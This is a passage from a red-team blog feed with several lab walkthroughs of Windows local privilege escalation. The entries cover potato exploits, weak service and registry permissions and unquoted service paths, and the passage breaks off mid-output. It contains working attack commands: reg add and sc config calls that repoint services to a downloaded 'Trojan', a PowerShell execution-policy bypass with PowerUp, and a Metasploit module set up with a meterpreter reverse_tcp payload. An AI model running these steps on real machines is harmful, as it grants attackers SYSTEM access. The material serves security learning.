isn&#39;t compatible with option -i\n&quot;);goto cleanup;&#125;&#125;else&#123;wprintf(L&quot;CreateProcessAsUser() failed. Error: %d\n&quot;, GetLastError());goto cleanup;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h2><h3 id="基本介绍-4"><a href="#基本介绍-4" class="headerlink" title="基本介绍"></a>基本介绍</h3><pre class="line-numbers language-none"><code class="language-none">和先前的Rotten potato &amp; Juicy potato相仿，rpc部分进行了改变，但依旧利用的是命名管道修复补丁后，Windows DCOM 解析器不允许OBJREF中的DUALSTRINGARRAY字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的135端口做流量转发，将其转回受害者本机端口，并写了一个恶意RPCOXID解析器RPC支持的协议https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-rpce&#x2F;472083a9-56f1-4d81-a208-d18aef68c101SMBncacn_np (see section 2.1.1.2)TCP&#x2F;IP (both IPv4 and IPv6)ncacn_ip_tcp (see section 2.1.1.1)UDPncadg_ip_udp (see section 2.1.2.1)SPXncacn_spx (see section 2.1.1.3)IPXncadg_ipx (see section 2.1.2.2)NetBIOS over IPXncacn_nb_ipx (see section 2.1.1.4)NetBIOS over TCPncacn_nb_tcp (see section 2.1.1.5)NetBIOS over NetBEUIncacn_nb_nb (see section 2.1.1.6)AppleTalkncacn_at_dsp (see section 2.1.1.7)RPC over HTTPncacn_http (see section 2.1.1.8)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Sweet-Potato"><a href="#Sweet-Potato" class="headerlink" title="Sweet Potato"></a>Sweet Potato</h2><h3 id="基本介绍-5"><a href="#基本介绍-5" class="headerlink" title="基本介绍"></a>基本介绍</h3><pre class="line-numbers language-none"><code class="language-none">com、winrm、spoolsv的合集版本，也就是juicy+printspoofer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> NamedPipes </tag>
            
            <tag> Potato </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weak Service Registry Permission Windows Privilege Promotion</title>
      <link href="2021/11/07/weak-service-registry-permission-windows-privilege-promotion/"/>
      <url>2021/11/07/weak-service-registry-permission-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">By hijacking the registry keys used by the service, an attacker can implement an application that executes maliciously<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Configure-the-environment"><a href="#Configure-the-environment" class="headerlink" title="Configure the environment"></a>Configure the environment</h3><pre class="line-numbers language-none"><code class="language-none">Create the following service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107203815803.png" alt="image-20211107203815803"></p><pre class="line-numbers language-none"><code class="language-none">Assign PTO rights to users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107203844878.png" alt="image-20211107203844878"></p><pre class="line-numbers language-none"><code class="language-none">To modify registry permissions, proceed as followsHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\5attack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107204022798.png" alt="image-20211107204022798"></p><pre class="line-numbers language-none"><code class="language-none">Grant full control over authenticating users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107204105018.png" alt="image-20211107204105018"></p><h3 id="accesschk64"><a href="#accesschk64" class="headerlink" title="accesschk64"></a>accesschk64</h3><pre class="line-numbers language-none"><code class="language-none">Current permissions are as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107204424723.png" alt="image-20211107204424723"></p><pre class="line-numbers language-none"><code class="language-none">Verify that ALL access is assigned to the authenticated useraccesschk64.exe &#x2F;accepteula &quot;authenticated users&quot; -kvuqsw hklm\System\CurrentControlSet\services<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107204544717.png" alt="image-20211107204544717"></p><pre class="line-numbers language-none"><code class="language-none">Gets the target executable path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107204637302.png" alt="image-20211107204637302"></p><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107204734722.png" alt="image-20211107204734722"></p><h3 id="winPEASx64-exe"><a href="#winPEASx64-exe" class="headerlink" title="winPEASx64.exe"></a>winPEASx64.exe</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107205258264.png" alt="image-20211107205258264"></p><h4 id="Using-the-details"><a href="#Using-the-details" class="headerlink" title="Using the details"></a>Using the details</h4><pre class="line-numbers language-none"><code class="language-none">Download the Trojan remotely and modify the service&#39;s executable directly through the registryreg add &quot;HKLM\system\currentcontrolset\services\5attack&quot; &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d &quot;C:\Users\y\13339.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107205722778.png" alt="image-20211107205722778"></p><pre class="line-numbers language-none"><code class="language-none">The permissions are as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Registry%20Permission%20Windows%20Privilege%20Promotion/image-20211107205715596.png" alt="image-20211107205715596"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weak Service Permission Windows Privilege Promotion</title>
      <link href="2021/11/07/weak-service-permission-windows-privilege-promotion/"/>
      <url>2021/11/07/weak-service-permission-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">The official introductionhttps:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;dotnet&#x2F;framework&#x2F;windows-services&#x2F;introduction-to-windows-service-applicationsThe system or user account must be connected to services to run properly. The following built-in system accounts are usually used for operating services：LocalServiceNetworkServiceLocalSystemWhen a service has createservice installed, the SCM creates a security descriptor for the service object, and the default security descriptor for the service object grants the following permissions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107191958116.png" alt="image-20211107191958116"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Focus on two types of insecure configuration points:1.Insecure profile permissions: Users with low permissions can update service Settings, such as executables when the service is running2.Insecure service executables: Low-privileged users can run their own programs by overwriting the executables of related service runtimes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Insecure-profile-permissions（PTOC）"><a href="#Insecure-profile-permissions（PTOC）" class="headerlink" title="Insecure profile permissions（PTOC）"></a>Insecure profile permissions（PTOC）</h3><pre class="line-numbers language-none"><code class="language-none">Create a new service as followssc create 3attack binPath&#x3D;&quot;C:\Users\Public\Documents\data\1.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107192753754.png" alt="image-20211107192753754"></p><pre class="line-numbers language-none"><code class="language-none">Assign permissions to users using subinACL progresssubinacl.exe &#x2F;service 3attack  &#x2F;grant&#x3D;y&#x3D;PTOC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107193040378.png" alt="image-20211107193040378"></p><h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><pre class="line-numbers language-none"><code class="language-none">A common user obtains system rights and tries to query service information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107193539512.png" alt="image-20211107193539512"></p><pre class="line-numbers language-none"><code class="language-none">View the target service 3attack information. The service account type is Localsystem and has permission to start and stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107193634940.png" alt="image-20211107193634940"></p><h3 id="accesschk64"><a href="#accesschk64" class="headerlink" title="accesschk64"></a>accesschk64</h3><pre class="line-numbers language-none"><code class="language-none">Look for SERVICE ALL ACCESS or SERVICE CHANGE CONFIG permissions, which allow an attacker to CHANGE service-related configurations<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107194521311.png" alt="image-20211107194521311"></p><h4 id="Using-the-details"><a href="#Using-the-details" class="headerlink" title="Using the details"></a>Using the details</h4><pre class="line-numbers language-none"><code class="language-none">Download Trojan files<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107194919724.png" alt="image-20211107194919724"></p><pre class="line-numbers language-none"><code class="language-none">Modify the service configuration and start the servicesc config 3attack binPath&#x3D; &quot;C:\Users\y\13340.exe&quot;sc start 13340<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107195022083.png" alt="image-20211107195022083"></p><pre class="line-numbers language-none"><code class="language-none">The permissions are as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107195057181.png" alt="image-20211107195057181"></p><h3 id="Insecure-service-executables（PTO）"><a href="#Insecure-service-executables（PTO）" class="headerlink" title="Insecure service executables（PTO）"></a>Insecure service executables（PTO）</h3><h4 id="Using-the-details-1"><a href="#Using-the-details-1" class="headerlink" title="Using the details"></a>Using the details</h4><pre class="line-numbers language-none"><code class="language-none">Directly modify the executable program executed by the service, remotely download our Trojan file and rename it the executable program name in the service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107200325197.png" alt="image-20211107200325197"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107200346789.png" alt="image-20211107200346789"></p><pre class="line-numbers language-none"><code class="language-none">Start the service and go online as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107200428741.png" alt="image-20211107200428741"></p><h3 id="MSF-direct-utilization"><a href="#MSF-direct-utilization" class="headerlink" title="MSF direct utilization"></a>MSF direct utilization</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>service_permissionsmsf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>service_permissions<span class="token punctuation">)</span> > optionsModule options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>service_permissions<span class="token punctuation">)</span>:   Name        Current Setting  Required  Description   <span class="token operator">--</span>-<span class="token operator">-</span>        <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>   AGGRESSIVE  false            no        Exploit as many services as possible <span class="token punctuation">(</span>dangerous<span class="token punctuation">)</span>   SESSION     5                yes       The session to run this module on<span class="token punctuation">.</span>   TIMEOUT     10               yes       Timeout <span class="token keyword">for</span> WMI command in secondsPayload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span>:   Name      Current Setting  Required  Description   <span class="token operator">--</span>-<span class="token operator">-</span>      <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>   EXITFUNC  thread           yes       <span class="token keyword">Exit</span> technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> <span class="token keyword">process</span><span class="token punctuation">,</span> none<span class="token punctuation">)</span>   LHOST     192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>122<span class="token punctuation">.</span>1    yes       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>   LPORT     4444             yes       The listen portExploit target:   Id  Name   <span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">-</span>   0   Automatic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107200824231.png" alt="image-20211107200824231"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Weak%20Service%20Permission%20Windows%20Privilege%20Promotion/image-20211107200837971.png" alt="image-20211107200837971.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unquoted Service Path Windows Privilege Promotion</title>
      <link href="2021/11/07/unquoted-service-path-windows-privilege-promotion/"/>
      <url>2021/11/07/unquoted-service-path-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">If the target binary Path is not quoted and contains Spaces, the vulnerability name of the installed Service is Service Unquoted Path, so local users can upgrade to administrator privileges by placing the executable in a more advanced directory within the Path，Of course, the service needs to be started<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">If the path contains Spaces and is not enclosed in quotes, how will Windows handle finding the target application?For example, if the service uses an unquoted path as followsC:\Program Files\My Data\My Service\1.exeThe system looks for them in the following orderC:\Program.exeC:\Program Files\My.exeC:\Program Files\My Data\My.exeC:\Program Files\My Data\My Service\1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Configure-the-environment"><a href="#Configure-the-environment" class="headerlink" title="Configure the environment"></a>Configure the environment</h3><pre class="line-numbers language-none"><code class="language-none">Create the target folder &amp; service as followsI&#39;m sure you must know the auto, what can be do!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211106190051785.png" alt="image-20211106190051785"></p><pre class="line-numbers language-none"><code class="language-none">Use ICACls to give Users write permission on My Data foldericacls &quot;C:\Program Files\My Data&quot; &#x2F;grant &quot;BUILTIN\Users&quot;:W<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107171137616.png" alt="image-20211107171137616"></p><pre class="line-numbers language-none"><code class="language-none">Here we use SubInACL to assign PTO permissions to the target user of the test service we just createdSubInACL is also a Microsoft command-line tool that can change permissions on files, folders, registry keys, services, printers, and a variety of other types of targetsUsers can be granted permission to suspend, start, and stop services<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211106191015658.png" alt="image-20211106191015658"></p><h3 id="Try-to-exploit"><a href="#Try-to-exploit" class="headerlink" title="Try to exploit"></a>Try to exploit</h3><h4 id="powerup-ps1"><a href="#powerup-ps1" class="headerlink" title="powerup.ps1"></a>powerup.ps1</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">All Win32_service objects are queried <span class="token keyword">using</span> <span class="token function">get-wmiObject</span> and the binary pathname is extracted <span class="token keyword">for</span> each object<span class="token punctuation">,</span> checking to see <span class="token keyword">if</span> any binary paths have Spaces and are not referenced<span class="token function">PS</span> C:\Users\y> powershell <span class="token operator">-</span>ep bypasspowershell <span class="token operator">-</span>ep bypassWindows PowerShellCopyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> 2016 Microsoft Corporation<span class="token punctuation">.</span> All rights reserved<span class="token punctuation">.</span><span class="token function">PS</span> C:\Users\y> <span class="token function">import-module</span> <span class="token punctuation">.</span>\powerup<span class="token punctuation">.</span>ps1<span class="token function">import-module</span> <span class="token punctuation">.</span>\powerup<span class="token punctuation">.</span>ps1<span class="token function">PS</span> C:\Users\y> <span class="token function">Get-UnquotedService</span><span class="token function">Get-UnquotedService</span>ServiceName    : 1attackPath           : C:\Program Files\My <span class="token keyword">Data</span>\My Service\1<span class="token punctuation">.</span>exeModifiablePath : @<span class="token punctuation">&#123;</span>ModifiablePath=C:\<span class="token punctuation">;</span> IdentityReference=NT AUTHORITY\Authenticated Users<span class="token punctuation">;</span> Permissions=AppendData<span class="token operator">/</span>AddSu                 bdirectory<span class="token punctuation">&#125;</span>StartName      : LocalSystemAbuseFunction  : <span class="token function">Write-ServiceBinary</span> <span class="token operator">-</span>Name <span class="token string">'1attack'</span> <span class="token operator">-</span>Path &lt;HijackPath>CanRestart     : TrueName           : 1attackServiceName    : 1attackPath           : C:\Program Files\My <span class="token keyword">Data</span>\My Service\1<span class="token punctuation">.</span>exeModifiablePath : @<span class="token punctuation">&#123;</span>ModifiablePath=C:\<span class="token punctuation">;</span> IdentityReference=NT AUTHORITY\Authenticated Users<span class="token punctuation">;</span> Permissions=System<span class="token punctuation">.</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>StartName      : LocalSystemAbuseFunction  : <span class="token function">Write-ServiceBinary</span> <span class="token operator">-</span>Name <span class="token string">'1attack'</span> <span class="token operator">-</span>Path &lt;HijackPath>CanRestart     : TrueName           : 1attackServiceName    : 1attackPath           : C:\Program Files\My <span class="token keyword">Data</span>\My Service\1<span class="token punctuation">.</span>exeModifiablePath : @<span class="token punctuation">&#123;</span>ModifiablePath=C:\Program Files\My <span class="token keyword">Data</span><span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=System<span class="token punctuation">.</span>Object<span class="token punctuation">[</span>                 <span class="token punctuation">]</span><span class="token punctuation">&#125;</span>StartName      : LocalSystemAbuseFunction  : <span class="token function">Write-ServiceBinary</span> <span class="token operator">-</span>Name <span class="token string">'1attack'</span> <span class="token operator">-</span>Path &lt;HijackPath>CanRestart     : TrueName           : 1attackServiceName    : 1attackPath           : C:\Program Files\My <span class="token keyword">Data</span>\My Service\1<span class="token punctuation">.</span>exeModifiablePath : @<span class="token punctuation">&#123;</span>ModifiablePath=C:\Program Files\My <span class="token keyword">Data</span><span class="token punctuation">;</span> IdentityReference=DESKTOP<span class="token operator">-</span>E3HH4KT\y<span class="token punctuation">;</span> Permissions=System<span class="token punctuation">.</span>Obj                 ect<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>StartName      : LocalSystemAbuseFunction  : <span class="token function">Write-ServiceBinary</span> <span class="token operator">-</span>Name <span class="token string">'1attack'</span> <span class="token operator">-</span>Path &lt;HijackPath>CanRestart     : TrueName           : 1attack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107171308151.png" alt="image-20211107171308151"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Based on the above<span class="token punctuation">,</span> three directories can be listedC:\Program FilesC:\Program Files\My <span class="token keyword">Data</span>C:\Program Files\My <span class="token keyword">Data</span>\My ServiceTake a look at the permissions on each of them<span class="token function">PS</span> C:\Users\y> icacls <span class="token string">"C:\Program Files"</span>icacls <span class="token string">"C:\Program Files"</span>C:\Program Files NT SERVICE\TrustedInstaller:<span class="token punctuation">(</span>F<span class="token punctuation">)</span>                 NT SERVICE\TrustedInstaller:<span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                 NT AUTHORITY\SYSTEM:<span class="token punctuation">(</span>M<span class="token punctuation">)</span>                 NT AUTHORITY\SYSTEM:<span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                 BUILTIN\Administrators:<span class="token punctuation">(</span>M<span class="token punctuation">)</span>                 BUILTIN\Administrators:<span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                 BUILTIN\Users:<span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                 BUILTIN\Users:<span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>                 CREATOR OWNER:<span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:<span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:<span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>                 APPLICATION PACKAGE AUTHORITY\���������Ƶ�Ӧ�ó����:<span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                 APPLICATION PACKAGE AUTHORITY\���������Ƶ�Ӧ�ó����:<span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>Successfully processed 1 files<span class="token punctuation">;</span> Failed processing 0 files<span class="token function">PS</span> C:\Users\y> icacls <span class="token string">"C:\Program Files\My Data"</span>icacls <span class="token string">"C:\Program Files\My Data"</span>C:\Program Files\My <span class="token keyword">Data</span> BUILTIN\Users:<span class="token punctuation">(</span>W<span class="token punctuation">)</span>                         DESKTOP<span class="token operator">-</span>E3HH4KT\y:<span class="token punctuation">(</span>W<span class="token punctuation">)</span>                         NT SERVICE\TrustedInstaller:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         NT SERVICE\TrustedInstaller:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         NT AUTHORITY\SYSTEM:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         NT AUTHORITY\SYSTEM:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         BUILTIN\Administrators:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         BUILTIN\Administrators:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token 